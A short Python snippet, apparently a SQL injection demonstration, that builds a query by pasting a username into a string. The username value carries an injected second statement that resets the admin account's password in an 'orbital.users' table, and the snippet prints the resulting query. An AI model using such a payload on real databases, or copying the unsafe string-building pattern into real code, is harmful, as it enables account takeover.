username = f'thinh%22; update orbital.users set password=%22hi_mom_are_you_there%22 where username=%22admin'

query = f'SELECT username, password FROM users WHERE username = "{username}"'

print(query)